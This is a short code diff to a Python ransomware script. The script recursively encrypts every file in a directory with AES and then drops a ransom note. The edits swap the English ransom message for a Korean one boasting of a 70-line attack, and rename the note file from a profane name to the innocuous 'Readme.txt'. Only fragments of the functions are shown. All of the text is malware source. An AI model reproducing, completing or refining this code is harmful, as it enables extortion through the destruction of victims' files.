@@ -4,7 +4,7 @@ import hashlib
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
 
-ENCRYPT_MESSAGE = "OooooooPs All Your Files Are Encrypted!!!!"
+ENCRYPT_MESSAGE = "당신의 파일들은 파이썬 단 70줄에 암호화 되었습니다.!"
 
 def encrypt_file(file_path, key):
     with open(file_path, 'rb') as file:
@@ -28,7 +28,7 @@ def ransomware(directory):
             file_path = os.path.join(root, file)
             encrypt_file(file_path, encryption_key)
 
-    with open(os.path.join(directory, 'FUCKED.txt'), 'w') as restore_file:
+    with open(os.path.join(directory, 'Readme.txt'), 'w') as restore_file:
         restore_file.write(ENCRYPT_MESSAGE)
 
     print("Ransomware attack completed. Files encrypted.")
